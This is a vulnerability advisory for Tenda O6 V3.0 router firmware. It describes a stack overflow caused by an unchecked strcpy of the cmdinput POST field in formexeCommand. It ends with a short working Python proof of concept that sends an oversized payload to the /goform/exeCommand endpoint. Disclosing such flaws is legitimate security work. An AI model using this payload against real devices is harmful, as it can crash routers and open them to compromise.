## Overview
- Firmware download website: [https://www.tenda.com.cn/download/detail-3861.html](https://www.tenda.com.cn/download/detail-3861.html)
## Affected version
  O6 V3.0 V1.0.0.7(2054)
## Vulnerability details
The O6 V3.0 V1.0.0.7(2054) firmware contains a stack overflow vulnerability in the `formexeCommand` function. Specifically, the `Var` variable is assigned the value of the `cmdinput` parameter from a POST request. Since `cmdinput` is user-controlled, its value can be manipulated to exceed the allocated size of the `v3` array. This vulnerability arises from the use of the `strcpy(v3 + 16, src)` statement, which does not perform bounds checking on the input. Consequently, if the length of the user-provided `cmdinput` exceeds the storage capacity of the `v3` array, it causes a buffer overflow, leading to a potential security exploit.

![[Pasted image 20240805171010.png]]

## POC
```python
import requests
ip = "192.168.109.145"
url = "http://" + ip + "/goform/exeCommand"
payload = b"ab"*3000

data = {"cmdinput": payload}
response = requests.post(url, data=data)
print(response.text)
```
![[Pasted image 20240805163853.png]]
